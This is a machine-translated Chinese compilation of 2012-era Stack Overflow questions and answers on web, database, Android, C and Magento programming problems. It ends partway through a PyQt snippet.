我今天遇到了同样的问题，我通过更改 .htaccess 文件解决了这个问题：

```
Options +FollowSymLinks
RewriteEngine on
RewriteBase /
RewriteCond $1 !^(index\.php|resources|robots\.txt)
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.*)$ index.php/$1 [L,QSA] 
```

**笔记：**

RewriteBase / 对我来说很重要。

# asp.net-mvc-3 - ajax.actionlink 发布表单未显示 ckeditor

> ID：13524618
> 
> 赞同：1
> 
> 时间：2012-11-23T07:20:18.497
> 
> 标签：asp.net-mvc-3, ckeditor, asp.net-mvc-ajax

使用 Ajax.ActionLink 作为之后

```
@Ajax.ActionLink("Edit", "AddEdit", new { @id = id, @recId = item.EncyclopediaID }, new AjaxOptions { InsertionMode = InsertionMode.Replace, UpdateTargetId = "listForm" }, new { @class = "edit_icon", @title = "edit this item" }) 
```

当控制器转到 AddEdit 页面时，我已经上传了文件并想要显示 Ckeditor。

所以我用

```
@using (Html.BeginForm("AddEdit", "Encyclopedia", FormMethod.Post, new { enctype = "multipart/form-data" }))
{
   /////////other code//////////////////
    @Html.EditorFor(model => model.Description,"CKEditor")
} 
```

现在，如果我使用显示@Html.ActionLink 而不是@Ajax.Actionlink Ckeditor 显示完美，并且在 Ajax 调用中显示为文本区域。

请帮忙。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T07:30:28.270

发生这种情况是因为 ckeditor 正常工作所需的资源文件（例如：`css`、、`javascript`）无法通过 ajax 调用下载。尝试在布局视图页面中引用所需的资源文件，然后重试。

**编辑 ：**

也许您已经在 document.ready 函数中放置了集成代码，因此在 ajax 请求完成并且您更改了标记后，新的标记（例如：您的新输入元素）未配置为 ckeditor 输入。所以尝试在 ajax 成功后调用 ckeditor 集成代码。

# c# - Entity Framework 并发刷新和更新

> ID：13524619
> 
> 赞同：5
> 
> 时间：2012-11-23T07:20:39.823
> 
> 标签：c#, entity-framework, concurrency, refresh, updates

我编写了一个 .NET + EF 应用程序。一切都在一个线程上正常工作。在多个线程上 - 这是另一个故事。

在我的 EF 对象中，我有一个整数计数器。此属性标记为“并发模式 = 固定”。基本上，我想做的是**在几个线程上更新这个计数器**。像这样的操作：

```
this.MyCounter -= 1; 
```

因为它的并发模式已更改为“固定”，所以当我试图更新已经更改的属性时 -`OptimisticConcurrencyException`抛出了一个。

为了解决这个并发问题，我使用这个代码：

```
while (true)
{
    try
    {
        this.UsageAmount -= 1; // Change the local EF object value and call SaveChanges().
        break;
    }
    catch (OptimisticConcurrencyException)
    {
        Logger.Output(LoggerLevel.Trace, this, "concurrency conflict detected.");
        EntityContainer.Instance.Entities.Refresh(RefreshMode.StoreWins, this.InnerObject);
    }
} 
```

这段代码的结果是一个无限循环（或者可能看起来像）。每次调用`this.UsageAmount -= 1`throw an`OptimisticConcurrencyException`都会导致循环再次运行。

My`EntityContainer.Instance.Entities`是一个单例类，它为每个线程提供一个 EF 上下文。这意味着每个线程都有一个唯一的上下文。编码：

```
public sealed class EntityContainer
    {
        #region Singlethon Implemantation
        private static Dictionary<Thread, EntityContainer> _instance = new Dictionary<Thread,EntityContainer> ();
        private static object syncRoot = new Object();
        public static EntityContainer Instance
        {
            get
            {
                if (!_instance.ContainsKey(Thread.CurrentThread))
                {
                    lock (syncRoot)
                    {
                        if (!_instance.ContainsKey(Thread.CurrentThread))
                            _instance.Add(Thread.CurrentThread, new EntityContainer());
                    }
                }
                return _instance[Thread.CurrentThread];
            }
        }
        private EntityContainer()
        {
            Entities = new anticopyEntities2();
        }
        #endregion

        anticopyEntities2 _entities;
        public anticopyEntities2 Entities
        {
            get
            {
                //return new anticopyEntities2();
                return _entities;
            }
            private set
            {
                _entities = value;
            }
        }
    } 
```

顺便说一句，在调用`Entities.Refresh`方法之后 - 它看起来正在工作（对象状态未更改，属性值正是数据库中存在的值）。

我该如何解决这个并发问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-18T13:26:12.500

我通过使用保存在数据库中的信号量在为多实例 azure webrole 编写的一些代码中解决了这个问题。这是我用来获取信号量的代码。我不得不添加一些额外的代码来处理我的竞争实例之间发生的竞争条件。我还添加了一个时间释放，以防我的信号量由于某些错误而被锁定。

```
 var semaphore = SemaphoreRepository.FetchMySemaphore(myContext);
        var past = DateTime.UtcNow.AddHours(-1);

        //check lock, break if in use.  Ignor if the lock is stale.
        if (semaphore == null || (semaphore.InUse && (semaphore.ModifiedDate.HasValue && semaphore.ModifiedDate > past)))
        {
            return;
        }

        //Update semaphore to hold lock
        try
        {
            semaphore.InUse = true;
            semaphore.OverrideAuditing = true;
            semaphore.ModifiedDate = DateTime.UtcNow;
            myContext.Entry(semaphore).State = EntityState.Modified;
            myContext.SaveChanges();
        }
        catch (DbUpdateConcurrencyException)
        {
            //concurrency exception handeling another thread beat us in the race.  exit
            return;
        }
        catch (DBConcurrencyException)
        {
            return;
        }

        //Do work here ... 
```

我的信号量模型如下所示：

```
using System.ComponentModel.DataAnnotations;

public class Semaphore : MyEntityBase //contains audit properties
{

    [Required]
    [ConcurrencyCheck]
    public bool InUse { get; set; }

    public string Description { get; set; }
} 
```

# java - 使用基本身份验证的 httpGet 上的 HTTP/1.1 400 错误请求

> ID：13524623
> 
> 赞同：3
> 
> 时间：2012-11-23T07:20:55.323
> 
> 标签：java, android, authentication, login, certificate

我制作了一个执行 httpGet 的应用程序。

我的应用程序使用我自己的证书，因此服务器需要用户登录。对于证书，我使用[了本](http://blog.antoine.li/2010/10/22/android-trusting-ssl-certificates/)教程。

对于 httpGet 我做了这个实现：

```
 HttpClient client = new CustClient(getApplicationContext()); // HttpClient that uses my certificates

               // Example send http request
               final String url = "https://ip:port/";// <--in  my implementation i've a right url
               HttpResponse response = null;

               HttpGet httpGet = new HttpGet(url);

               //login
               httpGet.addHeader("Authorization", "Basic "+Base64.encodeToString("root:root".getBytes(),Base64.DEFAULT));

               StringBuilder testo = null;
               try {
                response = client.execute(httpGet);
                InputStream contenuto = response.getEntity().getContent();
                BufferedReader rd = new BufferedReader(new InputStreamReader(contenuto));

                String line;
                // Read response until the end
                while ((line = rd.readLine()) != null) { 

                    testo.append(line); 
                }
            } catch (Exception e) {

            } 
```

为什么我让**client.execute(httpGet)**响应是 *HTTP/1.1 400 Bad Request*。为什么？在我的代码中进行身份验证是否正确？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-11-23T14:01:09.427

问题是授权标头。

我们必须使用：

```
httpGet.addHeader("Authorization", "Basic "+Base64.encodeToString("root:root".getBytes(),Base64.NO_WRAP)); 
```

代替：

```
httpGet.addHeader("Authorization", "Basic "+Base64.encodeToString("root:root".getBytes(),Base64.DEFAULT)); 
```

因为 DEFAULT 参数在字符串末尾添加了“CR”行终止符，如果您使用该标题，则它是不正确的。

# c# - 使用 jQuery 和 Asp.net C# 的多图像上传器

> ID：13524624
> 
> 赞同：0
> 
> 时间：2012-11-23T07:20:58.747
> 
> 标签：c#, jquery, asp.net, ajax

我正在寻找一个使用 jQuery 或 Ajax 的多图像上传器，它在上传图像时向我显示缩略图，并且具有很棒的外观。我在互联网上下载任何代码，但我发现只有与开源服务器端交互或工作的文件平台（PHP、Python、Ruby on Rails、Java、Node.js、Go 等）

以下是链接

```
http://blueimp.github.com/jQuery-File-Upload/ 
```

任何链接或建议都将受到热烈欢迎..

提前致谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T08:19:05.947

您链接到的文件上传显示缩略图，并已与 ASP.Net 一起使用。我已经成功实现了它，该项目的[wiki](https://github.com/blueimp/jQuery-File-Upload/wiki)链接到显示它是如何在 .NET 中实现的页面，以及代码示例。

如果您无法下载代码示例，您可以随时在使用 MVC3 的 Github 上浏览[此示例的源代码。](https://github.com/maxpavlov/jQuery-File-Upload.MVC3)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T07:25:20.113

[http://www.uploadify.com/demos/](http://www.uploadify.com/demos/)

检查这个网站。这似乎又好又容易。

# c# - 将基类引用类型转换为其实际类型

> ID：13524632
> 
> 赞同：2
> 
> 时间：2012-11-23T07:21:41.603
> 
> 标签：c#, casting, polymorphism

我有一个 BaseFilter 类和一些 BaseFilter 类的派生类。

```
1\. List<base> list = getFilters();
2\. foreach(Base filter in list){
3\.     var filterType = filter.GetType();
4\.     var filter1 = filter as filterType;
5\.     //DO SOME DERIVED CLASS OPERATION
6\. } 
```

我在代码行 3 处遇到错误。挑战是过滤器可以是任何派生类类型。有没有办法将过滤器对象类型转换为其实际的派生类？

我收到以下错误：找不到类型或命名空间名称“filterType”（您是否缺少 using 指令或程序集引用？）

正确的方法应该是什么？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-23T07:23:13.880

> 有没有办法将过滤器对象类型转换为其实际的派生类？

*不，您必须在 compile-time*知道您尝试转换为的类型。

如果你不知道那个类型，你怎么知道要执行哪个操作呢？如果您对所有类型执行相同的操作，则该操作应该存在（可能以抽象形式）在基类中。

基本上，目前您的请求不是一个有用的请求 - 但如果您可以提供更多关于您*实际*尝试做的事情的详细信息，以及为什么您认为“转换为实际类型”是合适的，我们可能会能够为您提供更多帮助。

在*某些*情况下，您可能会发现 using`dynamic`会有所帮助 - 但我只会在更清洁的方法失败后将其用作最后的手段 - 在不知道您想要实现什么的情况下，我们无法就这些更清洁的方法向您提供建议.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-23T07:39:51.523

正如 Jon Skeet 已经说过的，你不能在不知道类型的情况下强制*转换*类型。但是，如果您在编译时知道少量派生类，则可以执行以下操作：

```
List<base> list = getFilters();
foreach(Base filter in list)
{
   if(filter is DerivedFilter1)
   {
      var derived1 = filter as DerivedFilter1;  
      // do some DerivedFilter1 specific operations
   }
   else if(filter is DerivedFilter2)
   {
      var derived2 = filter as DerivedFilter2;  
      // do some DerivedFilter2 specific operations
   }
   else 
   {
      // do some general operations
   }
} 
```

# linkedin - Android：Linkedin 请求令牌失败

> ID：13524634
> 
> 赞同：0
> 
> 时间：2012-11-23T07:21:43.547
> 
> 标签：linkedin

我在我的android项目中使用了1.0.429版的linkedin-j-android.jar

这是下载带有范围修复 [http://db.tt/yQjhqeq3](http://db.tt/yQjhqeq3)的已修补linkedin-j-android.jar的链接， 下面是我在项目中使用的代码：

```
class  ShowNetWorkUtils{
    public static final String CONSUMER_KEY =    "xxxxx"; 
    public static final String CONSUMER_SECRET = "yyyy";
    public static final String OAUTH_CALLBACK_SCHEME = "x-oauthflow-linkedin";
    public static final String OAUTH_CALLBACK_HOST = "calback";
    public String scopeParams="rw_nus+r_baseprofile";
    public static final String OAUTH_CALLBACK_URL = OAUTH_CALLBACK_SCHEME
            + "://" + OAUTH_CALLBACK_HOST;

    private void configureLinkedIn() {
    new Thread(){
    @Override
    public void run() {
    try {
    Looper.prepare();
    LinkedInOAuthService  oauthService = LinkedInOAuthServiceFactory.getInstance().createLinkedInOAuthService       (CONSUMER_KEY,CONSUMER_SECRET,scopeParams);
    LinkedInApiClientFactory factory = LinkedInApiClientFactory.newInstance(CONSUMER_KEY,CONSUMER_SECRET);

    LinkedInRequestToken liToken = oauthService.getOAuthRequestToken(OAUTH_CALLBACK_URL);

 //LinkedInRequestToken liToken = oauthService.getOAuthRequestToken();

    String url = liToken.getAuthorizationUrl();

 /*  For Linkedin dialog create and show     */

     LKDialog lkdDialog = new LKDialog(_context, url);
     LKDialog lkdDialog.setDelegate(ShowNetWorkUtils.this);
     LKDialog lkdDialog.show();
    Looper.loop();
    }
    catch (Exception e) {
       e.printStackTrace();                     
       }

    }      //End run
         }.start();
     }

}  //End Class 
```

当我在“oauthService.getOAuthRequestToken(OAUTH_CALLBACK_URL)”行中请求令牌时出现异常，并且我使用了“oauthService.getOAuthRequestToken()”，但在这种情况下我也遇到了同样的异常。

例外是：com.google.code.linkedinapi.client.oauth.LinkedInOAuthServiceException：oauth.signpost.exception.OAuthCommunicationException：与服务提供商的通信失败：[https ://api.linkedin.com/uas/oauth/requestToken?scope =rw_nus+r_baseprofile](https://api.linkedin.com/uas/oauth/requestToken?scope=rw_nus+r_baseprofile)

请为我提供一些解决方案来解决这个问题..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T07:29:48.453

替换代码中的以下行

```
 public String scopeParams="rw_nus+r_baseprofile"; 
```

和

```
 public String scopeParams="rw_nus+r_basicprofile"; 
```

因为权限范围是`r_basicprofile`但是你写成`r_baseprofile`

希望它会帮助你。

# python - 如何使用 python 从 mongoDB 中的 10 亿个文档中获取随机单个文档？

> ID：13524641
> 
> 赞同：10
> 
> 时间：2012-11-23T07:22:40.387
> 
> 标签：python, mongodb, pymongo

我想要来自 mongoDB 集合的单个随机文档。现在我的 mongoDB 集合包含超过 10 亿个集合。如何从该集合中获取单个随机文档？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-11-23T07:30:54.563

我从未在 Python 中使用过 MongoDB，但是对于您的问题有一个通用的解决方案。这是一个用于获取单个随机文档的 MongoDB shell 脚本：

```
N = db.collection.count(condition)
db.collection.find(condition).limit(1).skip(Math.floor(Math.random()*N)) 
```

`condition`这是一个 MongoDB 查询。如果要查询整个集合，请使用`query = null`.

这是一个通用解决方案，因此它适用于任何 MongoDB 驱动程序。

* * *

# 更新

我运行了一个基准测试来测试几个实现。首先，我创建了包含 5567249 个带有**索引**随机字段的文档的测试集合`rnd`。

我选择了三种方法相互比较：

第一种方法：

```
db.collection.find().limit(1).skip(Math.floor(Math.random()*N)) 
```

第二种方法：

```
db.collection.find({rnd: {$gte: Math.random()}}).sort({rnd:1}).limit(1) 
```

第三种方法：

```
db.collection.findOne({rnd: {$gte: Math.random()}}) 
```

我将每种方法运行了 10 次，得到了它的平均计算时间：

```
method 1: 882.1 msec
method 2: 1.2 msec
method 3: 0.6 msec 
```

这个基准表明我的解决方案不是最快的。

但是第三种解决方案也不是一个好的解决方案，因为它找到了数据库中的第一个元素（按**自然顺序排序**）`rnd > random()`。因此，它的输出并不是真正随机的。

我认为第二种方法是经常使用的最佳方法。但它有一个缺陷：它需要更改整个数据库并确保附加索引。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-11-23T07:32:19.040

为您的集合添加一个名为的附加列`random`，并使其中的值介于 0 到 1 之间。您可以通过 为每条记录分配 0 到 1 之间的随机浮点到此列中`[random.random() for _ in range(0, 10)]`。

然后：-

```
import random

collection = mongodb["collection_name"]

rand = random.random()  # rand will be a floating point between 0 to 1.
random_record = collection.find_one({ 'random' => { '$gte' => rand } }) 
```

MongoDB 将在适当的时候有它的本地实现。在此处提交功能 - [https://jira.mongodb.org/browse/SERVER-533](https://jira.mongodb.org/browse/SERVER-533)

在撰写本文时尚未实施。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2016-04-27T08:32:18.620

由于`MongoDB 3.2`，它可以使用`aggregate`带有`$sample`运算符的函数来完成，如[docs](https://docs.mongodb.org/manual/reference/operator/aggregation/sample/#pipe._S_sample)中所述。它超级快。以下代码将从集合中随机选择 20 个文档。

```
db.collection.aggregate( [ { $sample: {size: 20} } ] ) 
```

如果您需要选择具有特定标准的随机文档，您可以将其与`$match`操作员一起使用

```
db.collection.aggregate([ 
    { $sample: {size: 20} }, 
    { $match:{"yourField": value} } 
  ]) 
```

当心订单！如果我在我的小型数据库中搜索大约 100k 个文档，上面的这个命令需要 15 毫秒，而当你切换顺序时，它是 1750 毫秒（慢了 100 倍以上）。原因当然很明显。此外，通过这个顺序，您可以获得那些随机 20 个文档的子集......

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-11-23T08:14:02.967

以高效的方式？至少可以说，如果不更改您的数据，这很难。

想象一下，您尝试从 1b 文档中获取 1,000,000 的 rand()。那会很慢，非常慢。这是因为 MongoDB 在跳过时没有有效利用索引。

正如@Calvin 所说，MongoDB 有一个获取随机文档的功能请求，但尚未实现。

如果您要定期执行此操作，atm 执行此操作的最高效方法是在您的记录中添加一个自动递增的 id：[http ://www.mongodb.org/display/DOCS/How+to+Make+an+ Auto+Incrementing+Field](http://www.mongodb.org/display/DOCS/How+to+Make+an+Auto+Incrementing+Field)并使用它来`rand()`打开。

### 编辑

澄清; 使用自动递增 id 时，您最初需要执行一个查询（除非您以另一种方式跟踪它）以获得该字段的最高值。您可以查询计数器集合或集合本身并反向排序 ( `sort({field:-1})`) 并`limit(1)`获得 的最大值`rand()`。

您还需要考虑数据的变化，这意味着您实际上想要`$gte`那个随机位置。

我的想法可以在这里得到更多解释：[php mongodb find nth entry in collection](https://stackoverflow.com/questions/12572485/php-mongodb-find-nth-entry-in-collection/12578257#12578257)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-11-23T07:28:52.353

如果您的对象上有 int id，您可以执行类似的操作

```
findOne({id: {$gte: rand()}}) 
```

# c++ - “.”的混合链 和“->”运算符

> ID：13524650
> 
> 赞同：2
> 
> 时间：2012-11-23T07:23:12.723
> 
> 标签：c++, c, pointers, nested, chaining

对成员引用和指针运算符的功能有些担忧。

举个例子：

```
struct ID{
    uint8_t index;
    bool active;
}

struct Square{
    struct ID shortID;
    struct BUDDY *bud;
    uint8_t x;
    uint8_t y;
}; 
```

然后我稍后返回一个指向正方形的指针。我的问题是：**然后我可以修改 ID 的成员并将更改反映在嵌套结构中吗？**

```
void function1()
{
    Square *someSquare = GetSquare(1);
    someSquare->shortID.index = 89; // Is this now reflected everywhere? OR was the shortID struct only modified in the scope of this funciton..
}

void function2()
{
    Square *someSquare = GetSquare(1);
    if ( someSquare->shortID.index != 89 )
    {
        // Dang...
    }
} 
```

谢谢！

**编辑：**

感谢简洁的答案，是的 GetSquare 函数返回一个指向正方形数组的指定索引的指针。像这样：

```
Square* GetSquare( uint8_t index )
{
    return &squares[index];  
} 
```

所以实例应该每次都相同，因为“squares”数组在对象创建时分配一次。所以感谢您的洞察力，我的问题必须在我的代码中的其他地方:)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T07:27:55.587

`Square*` 是的，因为 someSquare 是 a`->`运算符就像 a `(*varname).`。所以它是指针的内容，你得到 type `Square`。然后你可以用 修改变量`.`，因为它是一个结构，所有变量都是公共的，不像在类中那样。

`GetSquare`如果返回相同的对象，您在 function1 中所做的更改可以在 function2 中看到，如果您`GetSquare`看起来像这样，则可能是这种情况。

```
Square * GetSquare(int i)
{
    static Square * pSquare = 0;
    if (pSquare)
        pSquare = malloc(sizeof(static Square));
    return pSquare;
} 
```

或者像这样的全局变量

```
static Square pSquare ;

Square * GetSquare(int i)
{
    return &pSquare;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T07:32:41.107

如果 function1 中的 Square 指针与 function2 中的 Square 指针指向同一个 Square，那么是的，您将在 function2 中看到 function1 中设置的值（假设函数按该顺序调用）。

如果指针指向不同的实例，您将看不到该值。

正如 juanchopanza 所指出的，这完全取决于您的 GetSquare 函数的作用。请发布该功能的定义。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T07:26:31.530

它将在范围内，因为您没有使用任何形式的全局实例。我不知道 getSquare 实际上做了什么，但我假设它实例化了 Square 类并返回实例......

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-23T07:29:16.553

访问`someSquare->someID.index`就像访问一样`someSquare->x`——在这两种情况下，它都会修改指向的对象`someSquare`（在第一种情况下，它正在修改子对象）。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-24T04:10:02.110

是的，如果 GetSquare(1) 返回相同的实例，那么更改也应该反映在 function2() 中。如果您想确定返回的实例是相同的，请尝试通过以下语句打印指针 someSquare 的值：

```
printf("Value of pointer: %p \n",someSquare); 
```

如果此值相同，则表示它们是相同的实例，更改应反映在 function2() 中。

GetSquare 也应该是任何类之外的全局函数或静态函数。如果它是实例函数，那么它将为不同的类对象访问不同的类“Square”数组。

除此之外，我无法根据可用的代码给出其他意见。

# android - 使用 fql 查询的用户喜欢状态

> ID：13524652
> 
> 赞同：0
> 
> 时间：2012-11-23T07:23:29.577
> 
> 标签：android

我正在使用以下查询来获取用户喜欢的状态

```
 fql?q=SELECT  likes.user_likes FROM stream WHERE  post_id = '1274834235_3976149403543' 
```

我希望结果是

```
 {
          "data": [
                 {
                     "likes": {

                     "user_likes": false
                              }
                        }
                     ]
                   } 
```

但我越来越像这样

```
 {
               "data": [
                      ]
               } 
```

我不知道为什么会这样。我需要添加什么吗？

帮助我，在此先感谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T10:14:13.470

SELECT likes.user_likes FROM stream WHERE post_id = '80329313253_10151282619473254'

通过添加friends_likes权限

它返回

```
{
  "data": [
    {
      "likes": {
        "user_likes": false
      }
    }
  ]
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T07:25:51.773

嗨尝试过，它对我有用，请参阅下文

当我尝试获取您的 post_id,object_id 时，我意识到所有 post_id 都是空的，但 facebook 为 post 提供了 object_id。（截图1）

```
SELECT  object_id, post_id FROM like WHERE user_id=me() 
```

然后我尝试为 object_id 获得喜欢（screenshoot2 和 screenshoot3）

```
SELECT user_id FROM like WHERE object_id="object_id" 
```

并返回喜欢该帖子的用户列表。因此，您可以从响应中获取总用户数。

**屏幕截图1**

![在此处输入图像描述](../Images/5c6f752a816498f77150f0c22cd4c9d5.png)

**截图2**

![在此处输入图像描述](../Images/31a00efcd49f857f07bb2f1d7b320bb7.png)

**截图3（直接获取方式）*

![在此处输入图像描述](../Images/4e4c038e6ba70ffc47e4c0756d9e6bba.png)

# git - Git - 无法从远程存储库中读取 - Windows

> ID：13524654
> 
> 赞同：0
> 
> 时间：2012-11-23T07:23:51.837
> 
> 标签：git, ssh

我创建了一个共享存储库并配置了 SSH 身份验证，它可以正常工作但是在尝试克隆它时我遇到了以下错误

```
Cloning into "project"
Fatal: could not read from remote repository. 
```

有人可以指出我正确的解决方案。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T15:09:38.027

我相信您的服务器的私有 ssh 密钥与您的本地私有密钥不同，或者您没有正确的访问权限。

# c# - 将数据类型 varchar 转换为数字时出错？

> ID：13524655
> 
> 赞同：-4
> 
> 时间：2012-11-23T07:23:55.840
> 
> 标签：c#, asp.net, sql

我正在更新记录。但它给出了错误

> 将数据类型 varchar 转换为数字时出错

这是查询：

```
UPDATE tbl_Contract_QutationDetails SET DCont_Discount_Var=23 
WHERE DCont_Qty_Code_Var='BLDG/CNQT/11-12/101' AND DCont_Contractor_Code_Var='CNTT1001' 
```

请给我解决方案。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T07:36:19.630

我建议您首先根据您传递的数据和它们检查列定义。

错误在说什么（假设它是由那段 sql 触发的）是您正在使用一些数字列，但是您将数据作为字符串传递，并且该字符串不代表数字。所以，

```
DCont_Discount_Var=23 
```

你确定 DCont_Discount 是一个数字吗？（似乎答案是肯定的）

`DCont_Qty_Code_Var='BLDG/CNQT/11-12/101'`

你确定 DCont_Qty_Code_Var 是一个字符串吗？

```
DCont_Contractor_Code_Var='CNTT1001' 
```

你确定 DCont_Contractor 被定义为字符串吗？

其中一列被定义为数字，我敢打赌

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T07:55:14.240

我的猜测`DCont_Discount_Var=23`应该是`DCont_Discount_Var='23'`

# java - HBase 中的行过滤器

> ID：13524657
> 
> 赞同：0
> 
> 时间：2012-11-23T07:24:02.277
> 
> 标签：java, hbase

我在 HBase 表中有 20 行，并且 rowkey 是从 1 到 20 的长格式。我想从中查询 rowkey 以 1 开头的记录。我试过了`PrefixFilter`，`BinaryPrefixComparator`但只有当 rowkey 是在字符串 fromat 中。如果它很长，则查询返回所有记录。我怎样才能做到这一点？

过滤器表达式

```
Scan scan=new Scan();
Filter rowFilter=new RowFilter(CompareOp.EQUAL, new BinaryPrefixComparator(Bytes.toBytes("1")));
//Filter rowFilter=new RowFilter(CompareOp.NOT_EQUAL, new BinaryPrefixComparator(Bytes.toBytes("1")));
scan.setFilter(rowFilter);
ResultScanner resultscanner=htable.getScanner(scan); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T22:08:08.400

如果行键是`long`，则必须在查询中引用它们`long`而不是字符串。
即：而不是`Bytes.toBytes("1")`使用*`Bytes.toBytes(1L)`*.

您可以设置要扫描的范围：

```
scan.setStartRow(Bytes.toBytes(1L));
scan.setStopRow(Bytes.toBytes(21L));  //since stopRow is exclusive 
```

# php - 文件“本地”中的更改不起作用

> ID：13524660
> 
> 赞同：0
> 
> 时间：2012-11-23T07:24:09.133
> 
> 标签：php, magento, local, core

当我在“核心”中的文件结构上创建“本地”结构中的文件时，Magento 看不到这种变化。为什么？可能我需要更改其他文件吗？我更改`core/Mage/Cutomer/controllers/AcountController.php`，将更改后的文件放入`local/Mage/Cutomer/controllers/AcountController.php`，但没有效果。

Magento 使用“核心”文件。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T12:24:58.890

我个人认为创建自定义模块是更好的方法，因为您可以使用“ModuleName”作为描述来指示该模块将对核心进行哪些更改，并使其他开发人员更容易修改您的代码未来

app/code/local/MageIgniter/ModuleName/controllers/AcountController.php

```
<?php
   require_once Mage::getModuleDir('controllers', 'Mage_Customer').DS.'AccountController.php';
   class MageIgniter_ModuleName_AccountController extends Mage_Customer_AccountController{

   } 
```

应用程序/代码/本地/MageIgniter/ModuleName/etc/config.xml

```
<?xml version="1.0" encoding="UTF-8"?>
<config>
<modules>
  <MageIgniter_ModuleName>
    <version>0.0.1</version>
  </MageIgniter_ModuleName>
</modules>
<frontend>
  <routers>
    <customer>
      <args>
        <modules>
          <MageIgniter_ModuleName before="Mage_Customer">MageIgniter_ModuleName</MageIgniter_ModuleName>
        </modules>
      </args>
    </customer>
  </routers>
</frontend>
</config> 
```

/app/etc/modules/MageIgniter_ModuleName.xml

```
<config>
    <modules>
        <MageIgniter_ModuleName>
            <active>true</active>
            <codePool>local</codePool>
        </MageIgniter_ModuleName>
    </modules>
</config> 
```

阅读更多 @

[如何扩展 Magento 核心控制器？](http://inchoo.net/tools-frameworks/how-to-extend-magento-core-controller/)

[Magento：覆盖核心文件（块、模型、资源、控制器）](http://prattski.com/2010/06/24/magento-overriding-core-files-blocks-models-resources-controllers/)

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-11-23T08:58:48.777

创建您自己的模块并编写一个与 magento 逻辑挂钩的观察者。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-11-23T10:49:54.750

我认为 magento 将代码池作为“核心”。所以它开始在核心直接找到那个类。

因此您可以更改文件应用程序-> 等-> 模块-> Mage_All.xml 找到以下内容并更改代码池，更改为

```
 <Mage_Customer>
         <active>true</active>
        <codePool>local</codePool>
        <depends>
            <Mage_Eav/>
            <Mage_Dataflow/>
            <Mage_Directory/>
        </depends>
    </Mage_Customer> 
```

# ruby-on-rails - collection_select 使用 formtastic_form

> ID：13524669
> 
> 赞同：0
> 
> 时间：2012-11-23T07:24:37.570
> 
> 标签：ruby-on-rails

我有两张桌子：`company`和`department`。在公司表中，我有`"departmentname"`用于保存从部门表中获取的部门名称的字段。我`formtastic`在我的视图中使用表单进行集合选择。

```
<%= set.input :departmentname ,:as => :select, :collection => Department.all) %> 
```

在我看来，我正在获取部门列表。在公司表中保存`"departmentname"`字段后具有部门 ID 而不是部门名称。

如何在我的公司表中保存部门名称而不是 id。

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T08:39:22.670

表中字段的名称是什么，`Department`其值将`departmentname`在`Company`表中？我猜是这样`name`，你的`department`表结构是这样的：

```
id    name
1     department 1
2     department 2 
```

尝试如下：

```
:collection => Hash[Department.all.map{|d| [d.name,d.name]}] 
```

但是，我想以下方法也可以（但不确定）

```
:collection => Hash[Department.all.map{|d| [d.name]}] 
```

# javascript - 键值样式javascript数组的长度一直为0

> ID：13524673
> 
> 赞同：1
> 
> 时间：2012-11-23T07:24:46.863
> 
> 标签：javascript

我像这样填充我的键值数组：

```
/**
 * Callback: Gets invoked by the server when the data returns
 * 
 * @param {Object} aObject
 */
function retrieveStringsFromServerCallback(aObject){

   for(var i = 0;i < aObject['xml'].strings.appStringsList.length;i++){
      var tKey = aObject['xml'].strings.appStringsList[i]["@key"];      
      var tValue = aObject['xml'].strings.appStringsList[i]['$'];
      configManager.addStringElement(tKey,tValue);

   }
} 
```

这是我的对象的设置器

```
/**
 * @param {string} aKey
 * @param {string} aValue
 */
this.addStringElement = function(aKey, aValue){
    self.iStringMap[aKey] = aValue;
    console.log("LENGTH: "+self.iStringMap.length);
} 
```

我添加了大约 300 个键值对，根据谷歌浏览器检查器，`iStringMap`正确填写。但是数组的长度似乎仍然为0。一定有问题。非常感谢任何帮助

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T07:27:26.847

您可以使用以下方法获取对象键的计数：

```
Object.keys(obj).length 
```

`Object.keys()`返回作为第一个参数传递的对象的键数组。之后，您将访问该`.length`数组的 。

# python - matplotlib FigureCanvasQTAgg：QWidget 上的慢速旋转和网格重叠表面

> ID：13524675
> 
> 赞同：3
> 
> 时间：2012-11-23T07:24:58.220
> 
> 标签：python, matplotlib, pyqt4

我有 qtdesigner 生成的小部件 - optim_plotting_frame.py（下面的代码）

```
 from PyQt4 import QtCore, QtGui

    try:
        _fromUtf8 = QtCore.QString.fromUtf8
    except AttributeError:
        _fromUtf8 = lambda s: s

    class Ui_optim_plotting_frame(object):
        def setupUi(self, optim_plotting_frame):
            optim_plotting_frame.setObjectName(_fromUtf8("optim_plotting_frame"))
            optim_plotting_frame.setWindowModality(QtCore.Qt.ApplicationModal)
            optim_plotting_frame.resize(700, 580)
